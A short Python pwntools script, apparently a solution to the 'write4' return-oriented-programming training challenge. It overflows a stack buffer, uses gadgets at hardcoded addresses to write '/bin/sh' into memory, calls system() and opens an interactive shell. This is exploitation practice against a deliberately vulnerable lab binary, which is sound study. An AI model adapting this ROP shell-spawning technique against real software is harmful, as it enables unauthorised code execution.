from pwn import *

binary = "./write4"
elf = ELF(binary)
p = process(binary)

def write_ropchain(pop_gadget_addr, target_addr, target_string, mov_gadget_addr):
	
	length = len(target_string)
	string_align = length % 8
	ropchain = ''
	
	if string_align != 0:
		target_string += (8 - string_align) * '\x00'
	for i in range(0, length, 8):
		ropchain += p64(pop_gadget_addr)
		ropchain += p64(target_addr + i)
		ropchain += target_string[i:i+8]
		ropchain += p64(mov_gadget_addr)

	return ropchain

data_addr = 0x601050
mov_gadget_addr = 0x400820
pop_pop_return = 0x400890
pop_return = 0x400893
target_string = "/bin/sh"
plt_system = elf.symbols["system"]

padding = 'A' * 40
payload = padding
payload += write_ropchain(pop_pop_return, data_addr, target_string, mov_gadget_addr)
payload += p64(pop_return)
payload += p64(data_addr)
payload += p64(plt_system)

p.sendline(payload)
p.interactive()
p.close()
